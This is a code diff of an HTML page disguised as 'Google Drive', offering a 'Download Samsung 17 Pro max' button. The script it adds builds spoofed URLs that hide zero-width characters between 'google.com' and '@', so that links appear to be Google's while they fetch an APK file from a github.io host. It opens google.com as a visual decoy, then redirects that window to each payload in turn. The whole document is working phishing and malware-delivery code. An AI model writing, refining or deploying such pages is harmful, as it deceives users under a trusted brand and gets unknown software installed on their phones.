@@ -3,48 +3,45 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Google Security Update</title>
+  <title>Google Drive</title>
 </head>
 <body>
-  <button onclick="trySpoofMethods()">Download Security Update</button>
+  <button onclick="advancedSpoof()">Download Samsung 17 Pro max</button>
 
   <script>
-    function trySpoofMethods() {
-      const methods = [
-        // Method 1: Using spaces and invisible characters
-        "https://google.com @ryynx88.github.io/chy.apk",
-        
-        // Method 2: Using zero-width characters
+    function advancedSpoof() {
+      // Method yang paling promising: zero-width characters
+      const payloads = [
+        // Zero-width space between google.com and @
         "https://google.com\u200B@ryynx88.github.io/chy.apk",
         
-        // Method 3: Using tab character
-        "https://google.com\t@ryynx88.github.io/chy.apk",
+        // Multiple zero-width characters
+        "https://google.com\u200B\u200C@ryynx88.github.io/chy.apk",
         
-        // Method 4: Multiple zero-width spaces
-        "https://google.com\u200B\u200C\u200D@ryynx88.github.io/chy.apk",
+        // Zero-width non-joiner
+        "https://google.com\u200C@ryynx88.github.io/chy.apk",
         
-        // Method 5: Using fullwidth @
-        "https://google.com＠ryynx88.github.io/chy.apk",
-        
-        // Method 6: Using mixed invisible chars
-        "https://google.com \u200B @ryynx88.github.io/chy.apk"
+        // Zero-width joiner  
+        "https://google.com\u200D@ryynx88.github.io/chy.apk"
       ];
 
-      methods.forEach((url, index) => {
-        setTimeout(() => {
-          console.log(`Trying method ${index + 1}`);
-          
-          // Try with iframe
-          const iframe = document.createElement('iframe');
-          iframe.style.display = 'none';
-          iframe.src = url;
-          document.body.appendChild(iframe);
-          
-          // Try with window.open
-          window.open(url, `frame${index}`);
-          
-        }, index * 800);
-      });
+      // Coba buka Google dulu untuk visual spoof
+      const w = window.open('https://google.com', 'googleFrame');
+      
+      setTimeout(() => {
+        // Coba semua payload
+        payloads.forEach((url, index) => {
+          setTimeout(() => {
+            // Redirect window Google ke payload
+            try {
+              w.location.href = url;
+            } catch(e) {
+              // Fallback ke window baru
+              window.open(url, `download${index}`);
+            }
+          }, index * 500);
+        });
+      }, 1000);
     }
   </script>
 </body>
